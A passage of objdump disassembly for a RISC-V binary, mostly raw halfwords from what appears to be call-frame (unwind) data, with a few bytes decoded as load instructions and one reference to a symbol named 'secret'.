 37c:	0000                	.2byte	0x0
 37e:	0000                	.2byte	0x0
 380:	0094                	.2byte	0x94
 382:	0000                	.2byte	0x0
 384:	0000                	.2byte	0x0
 386:	0000                	.2byte	0x0
 388:	0e44                	.2byte	0xe44
 38a:	4420                	.2byte	0x4420
 38c:	0288                	.2byte	0x288
 38e:	0c44                	.2byte	0xc44
 390:	0008                	.2byte	0x8
 392:	8002                	.2byte	0x8002
 394:	0cc8                	.2byte	0xcc8
 396:	2002                	.2byte	0x2002
 398:	0e44                	.2byte	0xe44
 39a:	0000                	.2byte	0x0
 39c:	0000                	.2byte	0x0
 39e:	0000                	.2byte	0x0
 3a0:	0034                	.2byte	0x34
 3a2:	0000                	.2byte	0x0
 3a4:	0040                	.2byte	0x40
 3a6:	0000                	.2byte	0x0
 3a8:	7ab4                	.2byte	0x7ab4
 3aa:	8000                	.2byte	0x8000
 3ac:	0000                	.2byte	0x0
 3ae:	0000                	.2byte	0x0
 3b0:	0440                	.2byte	0x440
 3b2:	0000                	.2byte	0x0
 3b4:	0000                	.2byte	0x0
 3b6:	0000                	.2byte	0x0
 3b8:	0e44                	.2byte	0xe44
 3ba:	5070                	.2byte	0x5070
 3bc:	0281                	.2byte	0x281
 3be:	0488                	.2byte	0x488
 3c0:	0689                	.2byte	0x689
 3c2:	0892                	.2byte	0x892
 3c4:	0c44                	.2byte	0xc44
 3c6:	0008                	.2byte	0x8
 3c8:	c1041403          	lh	s0,-1008(s0)
 3cc:	c844                	.2byte	0xc844
 3ce:	020c                	.2byte	0x20c
 3d0:	4470                	.2byte	0x4470
 3d2:	44c9                	.2byte	0x44c9
 3d4:	44d2                	.2byte	0x44d2
 3d6:	000e                	.2byte	0xe
 3d8:	002c                	.2byte	0x2c
 3da:	0000                	.2byte	0x0
 3dc:	0040                	.2byte	0x40
 3de:	0000                	.2byte	0x0
 3e0:	7ef4                	.2byte	0x7ef4
 3e2:	8000                	.2byte	0x8000
 3e4:	0000                	.2byte	0x0
 3e6:	0000                	.2byte	0x0
 3e8:	0078                	.2byte	0x78
 3ea:	0000                	.2byte	0x0
 3ec:	0000                	.2byte	0x0
 3ee:	0000                	.2byte	0x0
 3f0:	0e44                	.2byte	0xe44
 3f2:	4870                	.2byte	0x4870
 3f4:	1281                	.2byte	0x1281
 3f6:	1488                	.2byte	0x1488
 3f8:	0c44                	.2byte	0xc44
 3fa:	4008                	.2byte	0x4008
 3fc:	5c02                	.2byte	0x5c02
 3fe:	44c1                	.2byte	0x44c1
 400:	0cc8                	.2byte	0xcc8
 402:	7002                	.2byte	0x7002
 404:	0e44                	.2byte	0xe44
 406:	0000                	.2byte	0x0
 408:	002c                	.2byte	0x2c
 40a:	0000                	.2byte	0x0
 40c:	0040                	.2byte	0x40
 40e:	0000                	.2byte	0x0
 410:	7f6c                	.2byte	0x7f6c
 412:	8000                	.2byte	0x8000
 414:	0000                	.2byte	0x0
 416:	0000                	.2byte	0x0
 418:	005c                	.2byte	0x5c
 41a:	0000                	.2byte	0x0
 41c:	0000                	.2byte	0x0
 41e:	0000                	.2byte	0x0
 420:	0e44                	.2byte	0xe44
 422:	4440                	.2byte	0x4440
 424:	0288                	.2byte	0x288
 426:	0c44                	.2byte	0xc44
 428:	0008                	.2byte	0x8
 42a:	4802                	.2byte	0x4802
 42c:	0cc8                	.2byte	0xcc8
 42e:	4002                	.2byte	0x4002
 430:	0e44                	.2byte	0xe44
 432:	0000                	.2byte	0x0
 434:	0000                	.2byte	0x0
 436:	0000                	.2byte	0x0
 438:	0034                	.2byte	0x34
 43a:	0000                	.2byte	0x0
 43c:	0040                	.2byte	0x40
 43e:	0000                	.2byte	0x0
 440:	7fc8                	.2byte	0x7fc8
 442:	8000                	.2byte	0x8000
 444:	0000                	.2byte	0x0
 446:	0000                	.2byte	0x0
 448:	00f0                	.2byte	0xf0
 44a:	0000                	.2byte	0x0
 44c:	0000                	.2byte	0x0
 44e:	0000                	.2byte	0x0
 450:	0e44                	.2byte	0xe44
 452:	0290                	.2byte	0x290
 454:	8148                	.2byte	0x8148
 456:	880e                	.2byte	0x880e
 458:	4410                	.2byte	0x4410
 45a:	080c                	.2byte	0x80c
 45c:	0230                	.2byte	0x230
 45e:	c1d4                	.2byte	0xc1d4
 460:	c844                	.2byte	0xc844
 462:	020c                	.2byte	0x20c
 464:	0290                	.2byte	0x290
 466:	0e44                	.2byte	0xe44
	...
 470:	002c                	.2byte	0x2c
 472:	0000                	.2byte	0x0
 474:	0040                	.2byte	0x40
 476:	0000                	.2byte	0x0
 478:	80b8                	.2byte	0x80b8
 47a:	8000                	.2byte	0x8000
 47c:	0000                	.2byte	0x0
 47e:	0000                	.2byte	0x0
 480:	00dc                	.2byte	0xdc
 482:	0000                	.2byte	0x0
 484:	0000                	.2byte	0x0
 486:	0000                	.2byte	0x0
 488:	0e44                	.2byte	0xe44
 48a:	4450                	.2byte	0x4450
 48c:	0288                	.2byte	0x288
 48e:	0c44                	.2byte	0xc44
 490:	0008                	.2byte	0x8
 492:	c802                	.2byte	0xc802
 494:	0cc8                	.2byte	0xcc8
 496:	5002                	.2byte	0x5002
 498:	0e44                	.2byte	0xe44
 49a:	0000                	.2byte	0x0
 49c:	0000                	.2byte	0x0
 49e:	0000                	.2byte	0x0
 4a0:	002c                	.2byte	0x2c
 4a2:	0000                	.2byte	0x0
 4a4:	0040                	.2byte	0x40
 4a6:	0000                	.2byte	0x0
 4a8:	8194                	.2byte	0x8194
 4aa:	8000                	.2byte	0x8000
 4ac:	0000                	.2byte	0x0
 4ae:	0000                	.2byte	0x0
 4b0:	00fc                	.2byte	0xfc
 4b2:	0000                	.2byte	0x0
 4b4:	0000                	.2byte	0x0
 4b6:	0000                	.2byte	0x0
 4b8:	0e44                	.2byte	0xe44
 4ba:	4450                	.2byte	0x4450
 4bc:	0288                	.2byte	0x288
 4be:	0c44                	.2byte	0xc44
 4c0:	0008                	.2byte	0x8
 4c2:	e802                	.2byte	0xe802
 4c4:	0cc8                	.2byte	0xcc8
 4c6:	5002                	.2byte	0x5002
 4c8:	0e44                	.2byte	0xe44
 4ca:	0000                	.2byte	0x0
 4cc:	0000                	.2byte	0x0
 4ce:	0000                	.2byte	0x0
 4d0:	002c                	.2byte	0x2c
 4d2:	0000                	.2byte	0x0
 4d4:	0040                	.2byte	0x40
 4d6:	0000                	.2byte	0x0
 4d8:	8290                	.2byte	0x8290
 4da:	8000                	.2byte	0x8000
 4dc:	0000                	.2byte	0x0
 4de:	0000                	.2byte	0x0
 4e0:	0050                	.2byte	0x50
 4e2:	0000                	.2byte	0x0
 4e4:	0000                	.2byte	0x0
 4e6:	0000                	.2byte	0x0
 4e8:	0e44                	.2byte	0xe44
 4ea:	4430                	.2byte	0x4430
 4ec:	0288                	.2byte	0x288
 4ee:	0c44                	.2byte	0xc44
 4f0:	0008                	.2byte	0x8
 4f2:	c87c                	.2byte	0xc87c
 4f4:	020c                	.2byte	0x20c
 4f6:	4430                	.2byte	0x4430
 4f8:	000e                	.2byte	0xe
 4fa:	0000                	.2byte	0x0
 4fc:	0000                	.2byte	0x0
 4fe:	0000                	.2byte	0x0
 500:	002c                	.2byte	0x2c
 502:	0000                	.2byte	0x0
 504:	0040                	.2byte	0x40
 506:	0000                	.2byte	0x0
 508:	82e0                	.2byte	0x82e0
 50a:	8000                	.2byte	0x8000
 50c:	0000                	.2byte	0x0
 50e:	0000                	.2byte	0x0
 510:	0064                	.2byte	0x64
 512:	0000                	.2byte	0x0
 514:	0000                	.2byte	0x0
 516:	0000                	.2byte	0x0
 518:	0e44                	.2byte	0xe44
 51a:	4430                	.2byte	0x4430
 51c:	0288                	.2byte	0x288
 51e:	0c44                	.2byte	0xc44
 520:	0008                	.2byte	0x8
 522:	5002                	.2byte	0x5002
 524:	0cc8                	.2byte	0xcc8
 526:	3002                	.2byte	0x3002
 528:	0e44                	.2byte	0xe44
 52a:	0000                	.2byte	0x0
 52c:	0000                	.2byte	0x0
 52e:	0000                	.2byte	0x0
 530:	002c                	.2byte	0x2c
 532:	0000                	.2byte	0x0
 534:	0040                	.2byte	0x40
 536:	0000                	.2byte	0x0
 538:	8344                	.2byte	0x8344
 53a:	8000                	.2byte	0x8000
 53c:	0000                	.2byte	0x0
 53e:	0000                	.2byte	0x0
 540:	0088                	.2byte	0x88
 542:	0000                	.2byte	0x0
 544:	0000                	.2byte	0x0
 546:	0000                	.2byte	0x0
 548:	0e44                	.2byte	0xe44
 54a:	4430                	.2byte	0x4430
 54c:	0288                	.2byte	0x288
 54e:	0c44                	.2byte	0xc44
 550:	0008                	.2byte	0x8
 552:	7402                	.2byte	0x7402
 554:	0cc8                	.2byte	0xcc8
 556:	3002                	.2byte	0x3002
 558:	0e44                	.2byte	0xe44
 55a:	0000                	.2byte	0x0
 55c:	0000                	.2byte	0x0
 55e:	0000                	.2byte	0x0
 560:	002c                	.2byte	0x2c
 562:	0000                	.2byte	0x0
 564:	0040                	.2byte	0x40
 566:	0000                	.2byte	0x0
 568:	83cc                	.2byte	0x83cc
 56a:	8000                	.2byte	0x8000
 56c:	0000                	.2byte	0x0
 56e:	0000                	.2byte	0x0
 570:	005c                	.2byte	0x5c
 572:	0000                	.2byte	0x0
 574:	0000                	.2byte	0x0
 576:	0000                	.2byte	0x0
 578:	0e44                	.2byte	0xe44
 57a:	4430                	.2byte	0x4430
 57c:	0288                	.2byte	0x288
 57e:	0c44                	.2byte	0xc44
 580:	0008                	.2byte	0x8
 582:	4802                	.2byte	0x4802
 584:	0cc8                	.2byte	0xcc8
 586:	3002                	.2byte	0x3002
 588:	0e44                	.2byte	0xe44
 58a:	0000                	.2byte	0x0
 58c:	0000                	.2byte	0x0
 58e:	0000                	.2byte	0x0
 590:	002c                	.2byte	0x2c
 592:	0000                	.2byte	0x0
 594:	0040                	.2byte	0x40
 596:	0000                	.2byte	0x0
 598:	8428                	.2byte	0x8428
 59a:	8000                	.2byte	0x8000
 59c:	0000                	.2byte	0x0
 59e:	0000                	.2byte	0x0
 5a0:	0110                	.2byte	0x110
 5a2:	0000                	.2byte	0x0
 5a4:	0000                	.2byte	0x0
 5a6:	0000                	.2byte	0x0
 5a8:	0e44                	.2byte	0xe44
 5aa:	4430                	.2byte	0x4430
 5ac:	0288                	.2byte	0x288
 5ae:	0c44                	.2byte	0xc44
 5b0:	0008                	.2byte	0x8
 5b2:	fc02                	.2byte	0xfc02
 5b4:	0cc8                	.2byte	0xcc8
 5b6:	3002                	.2byte	0x3002
 5b8:	0e44                	.2byte	0xe44
 5ba:	0000                	.2byte	0x0
 5bc:	0000                	.2byte	0x0
 5be:	0000                	.2byte	0x0
 5c0:	000c                	.2byte	0xc
 5c2:	0000                	.2byte	0x0
 5c4:	ffff                	.2byte	0xffff
 5c6:	ffff                	.2byte	0xffff
 5c8:	7c010003          	lb	zero,1984(sp)
 5cc:	0d01                	.2byte	0xd01
 5ce:	0002                	.2byte	0x2
 5d0:	002c                	.2byte	0x2c
 5d2:	0000                	.2byte	0x0
 5d4:	05c0                	.2byte	0x5c0
 5d6:	0000                	.2byte	0x0
 5d8:	8538                	.2byte	0x8538
 5da:	8000                	.2byte	0x8000
 5dc:	0000                	.2byte	0x0
 5de:	0000                	.2byte	0x0
 5e0:	004c                	.2byte	0x4c
 5e2:	0000                	.2byte	0x0
 5e4:	0000                	.2byte	0x0
 5e6:	0000                	.2byte	0x0
 5e8:	0e44                	.2byte	0xe44
 5ea:	4430                	.2byte	0x4430
 5ec:	0288                	.2byte	0x288
 5ee:	0c44                	.2byte	0xc44
 5f0:	0008                	.2byte	0x8
 5f2:	c878                	.2byte	0xc878
 5f4:	020c                	.2byte	0x20c
 5f6:	4430                	.2byte	0x4430
 5f8:	000e                	.2byte	0xe
 5fa:	0000                	.2byte	0x0
 5fc:	0000                	.2byte	0x0
 5fe:	0000                	.2byte	0x0
 600:	002c                	.2byte	0x2c
 602:	0000                	.2byte	0x0
 604:	05c0                	.2byte	0x5c0
 606:	0000                	.2byte	0x0
 608:	8584                	.2byte	0x8584
 60a:	8000                	.2byte	0x8000
 60c:	0000                	.2byte	0x0
 60e:	0000                	.2byte	0x0
 610:	0260                	.2byte	0x260
 612:	0000                	.2byte	0x0
 614:	0000                	.2byte	0x0
 616:	0000                	.2byte	0x0
 618:	0e44                	.2byte	0xe44
 61a:	4420                	.2byte	0x4420
 61c:	0288                	.2byte	0x288
 61e:	0c44                	.2byte	0xc44
 620:	0008                	.2byte	0x8
 622:	c8024c03          	lbu	s8,-896(tp) # fffffffffffffc80 <secret+0xffffffff7f7ffc80>
 626:	020c                	.2byte	0x20c
 628:	4420                	.2byte	0x4420
 62a:	000e                	.2byte	0xe
 62c:	0000                	.2byte	0x0
 62e:	0000                	.2byte	0x0
 630:	000c                	.2byte	0xc
 632:	0000                	.2byte	0x0
 634:	ffff                	.2byte	0xffff
 636:	ffff                	.2byte	0xffff
 638:	7c010003          	lb	zero,1984(sp)
 63c:	0d01                	.2byte	0xd01
 63e:	0002                	.2byte	0x2
 640:	002c                	.2byte	0x2c
 642:	0000                	.2byte	0x0
 644:	0630                	.2byte	0x630
 646:	0000                	.2byte	0x0
 648:	87e4                	.2byte	0x87e4
 64a:	8000                	.2byte	0x8000
 64c:	0000                	.2byte	0x0
 64e:	0000                	.2byte	0x0
 650:	002c                	.2byte	0x2c
 652:	0000                	.2byte	0x0
 654:	0000                	.2byte	0x0
 656:	0000                	.2byte	0x0
 658:	0e44                	.2byte	0xe44
 65a:	4430                	.2byte	0x4430
 65c:	0288                	.2byte	0x288
 65e:	0c44                	.2byte	0xc44
 660:	0008                	.2byte	0x8
 662:	c858                	.2byte	0xc858
 664:	020c                	.2byte	0x20c
 666:	4430                	.2byte	0x4430
 668:	000e                	.2byte	0xe
 66a:	0000                	.2byte	0x0
 66c:	0000                	.2byte	0x0
 66e:	0000                	.2byte	0x0
 670:	002c                	.2byte	0x2c
 672:	0000                	.2byte	0x0
 674:	0630                	.2byte	0x630
 676:	0000                	.2byte	0x0
 678:	8810                	.2byte	0x8810
 67a:	8000                	.2byte	0x8000
 67c:	0000                	.2byte	0x0
 67e:	0000                	.2byte	0x0
 680:	002c                	.2byte	0x2c
 682:	0000                	.2byte	0x0
 684:	0000                	.2byte	0x0
 686:	0000                	.2byte	0x0
 688:	0e44                	.2byte	0xe44
 68a:	4430                	.2byte	0x4430
 68c:	0288                	.2byte	0x288
 68e:	0c44                	.2byte	0xc44
 690:	0008                	.2byte	0x8
 692:	c858                	.2byte	0xc858
 694:	020c                	.2byte	0x20c
 696:	4430                	.2byte	0x4430
 698:	000e                	.2byte	0xe
 69a:	0000                	.2byte	0x0
 69c:	0000                	.2byte	0x0
 69e:	0000                	.2byte	0x0
 6a0:	002c                	.2byte	0x2c
 6a2:	0000                	.2byte	0x0
 6a4:	0630                	.2byte	0x630
 6a6:	0000                	.2byte	0x0
 6a8:	883c                	.2byte	0x883c
 6aa:	8000                	.2byte	0x8000
 6ac:	0000                	.2byte	0x0
 6ae:	0000                	.2byte	0x0
 6b0:	0178                	.2byte	0x178
 6b2:	0000                	.2byte	0x0
 6b4:	0000                	.2byte	0x0
 6b6:	0000                	.2byte	0x0
 6b8:	0e44                	.2byte	0xe44
 6ba:	4450                	.2byte	0x4450
 6bc:	0288                	.2byte	0x288
 6be:	0c44                	.2byte	0xc44
 6c0:	0008                	.2byte	0x8
 6c2:	c8016403          	lwu	s0,-896(sp)
 6c6:	020c                	.2byte	0x20c
 6c8:	4450                	.2byte	0x4450
 6ca:	000e                	.2byte	0xe
 6cc:	0000                	.2byte	0x0
 6ce:	0000                	.2byte	0x0
 6d0:	002c                	.2byte	0x2c
 6d2:	0000                	.2byte	0x0
 6d4:	0630                	.2byte	0x630
 6d6:	0000                	.2byte	0x0
 6d8:	89b4                	.2byte	0x89b4
 6da:	8000                	.2byte	0x8000
 6dc:	0000                	.2byte	0x0
 6de:	0000                	.2byte	0x0
 6e0:	0188                	.2byte	0x188
 6e2:	0000                	.2byte	0x0
 6e4:	0000                	.2byte	0x0
 6e6:	0000                	.2byte	0x0
 6e8:	0e44                	.2byte	0xe44
 6ea:	4460                	.2byte	0x4460
 6ec:	0288                	.2byte	0x288
 6ee:	0c44                	.2byte	0xc44
 6f0:	0008                	.2byte	0x8
 6f2:	c8017403          	.4byte	0xc8017403
 6f6:	020c                	.2byte	0x20c
 6f8:	4460                	.2byte	0x4460
 6fa:	000e                	.2byte	0xe
 6fc:	0000                	.2byte	0x0
 6fe:	0000                	.2byte	0x0
 700:	002c                	.2byte	0x2c
 702:	0000                	.2byte	0x0
 704:	0630                	.2byte	0x630
 706:	0000                	.2byte	0x0
 708:	8b3c                	.2byte	0x8b3c
 70a:	8000                	.2byte	0x8000
 70c:	0000                	.2byte	0x0
 70e:	0000                	.2byte	0x0
 710:	00a8                	.2byte	0xa8
 712:	0000                	.2byte	0x0
 714:	0000                	.2byte	0x0
 716:	0000                	.2byte	0x0
 718:	0e44                	.2byte	0xe44
 71a:	4420                	.2byte	0x4420
 71c:	0288                	.2byte	0x288
 71e:	0c44                	.2byte	0xc44
 720:	0008                	.2byte	0x8
 722:	9402                	.2byte	0x9402
 724:	0cc8                	.2byte	0xcc8
 726:	2002                	.2byte	0x2002
 728:	0e44                	.2byte	0xe44
 72a:	0000                	.2byte	0x0
 72c:	0000                	.2byte	0x0
 72e:	0000                	.2byte	0x0
 730:	002c                	.2byte	0x2c
 732:	0000                	.2byte	0x0
 734:	0630                	.2byte	0x630
 736:	0000                	.2byte	0x0
 738:	8be4                	.2byte	0x8be4
 73a:	8000                	.2byte	0x8000
 73c:	0000                	.2byte	0x0
 73e:	0000                	.2byte	0x0
 740:	004c                	.2byte	0x4c
 742:	0000                	.2byte	0x0
 744:	0000                	.2byte	0x0
 746:	0000                	.2byte	0x0
 748:	0e44                	.2byte	0xe44
 74a:	4430                	.2byte	0x4430
 74c:	0288                	.2byte	0x288
 74e:	0c44                	.2byte	0xc44
 750:	0008                	.2byte	0x8
 752:	c878                	.2byte	0xc878
 754:	020c                	.2byte	0x20c
 756:	4430                	.2byte	0x4430
 758:	000e                	.2byte	0xe
 75a:	0000                	.2byte	0x0
 75c:	0000                	.2byte	0x0
 75e:	0000                	.2byte	0x0
 760:	002c                	.2byte	0x2c
 762:	0000                	.2byte	0x0
 764:	0630                	.2byte	0x630
 766:	0000                	.2byte	0x0
 768:	8c30                	.2byte	0x8c30
 76a:	8000                	.2byte	0x8000
 76c:	0000                	.2byte	0x0
 76e:	0000                	.2byte	0x0
 770:	004c                	.2byte	0x4c
 772:	0000                	.2byte	0x0
 774:	0000                	.2byte	0x0
 776:	0000                	.2byte	0x0
 778:	0e44                	.2byte	0xe44
 77a:	4430                	.2byte	0x4430
 77c:	0288                	.2byte	0x288
 77e:	0c44                	.2byte	0xc44
 780:	0008                	.2byte	0x8
 782:	c878                	.2byte	0xc878
 784:	020c                	.2byte	0x20c
 786:	4430                	.2byte	0x4430
 788:	000e                	.2byte	0xe
 78a:	0000                	.2byte	0x0
 78c:	0000                	.2byte	0x0
 78e:	0000                	.2byte	0x0
 790:	002c                	.2byte	0x2c
 792:	0000                	.2byte	0x0
 794:	0630                	.2byte	0x630
 796:	0000                	.2byte	0x0
 798:	8c7c                	.2byte	0x8c7c
 79a:	8000                	.2byte	0x8000
 79c:	0000                	.2byte	0x0
 79e:	0000                	.2byte	0x0
 7a0:	00e8                	.2byte	0xe8
 7a2:	0000                	.2byte	0x0
 7a4:	0000                	.2byte	0x0
 7a6:	0000                	.2byte	0x0
 7a8:	0e44                	.2byte	0xe44
 7aa:	4420                	.2byte	0x4420
 7ac:	0288                	.2byte	0x288
 7ae:	0c44                	.2byte	0xc44
 7b0:	0008                	.2byte	0x8
 7b2:	d402                	.2byte	0xd402
 7b4:	0cc8                	.2byte	0xcc8
 7b6:	2002                	.2byte	0x2002
 7b8:	0e44                	.2byte	0xe44
 7ba:	0000                	.2byte	0x0
 7bc:	0000                	.2byte	0x0
 7be:	0000                	.2byte	0x0
 7c0:	0034                	.2byte	0x34
 7c2:	0000                	.2byte	0x0
 7c4:	0630                	.2byte	0x630
 7c6:	0000                	.2byte	0x0
 7c8:	8d64                	.2byte	0x8d64
 7ca:	8000                	.2byte	0x8000
 7cc:	0000                	.2byte	0x0
 7ce:	0000                	.2byte	0x0
 7d0:	0198                	.2byte	0x198
 7d2:	0000                	.2byte	0x0
 7d4:	0000                	.2byte	0x0
 7d6:	0000                	.2byte	0x0
 7d8:	0e44                	.2byte	0xe44
 7da:	0190                	.2byte	0x190
 7dc:	8148                	.2byte	0x8148
 7de:	8802                	.2byte	0x8802
 7e0:	4404                	.2byte	0x4404
 7e2:	080c                	.2byte	0x80c
 7e4:	0300                	.2byte	0x300
 7e6:	017c                	.2byte	0x17c
 7e8:	44c1                	.2byte	0x44c1
 7ea:	0cc8                	.2byte	0xcc8
 7ec:	9002                	.2byte	0x9002
 7ee:	4401                	.2byte	0x4401
 7f0:	000e                	.2byte	0xe
 7f2:	0000                	.2byte	0x0
 7f4:	0000                	.2byte	0x0
	...
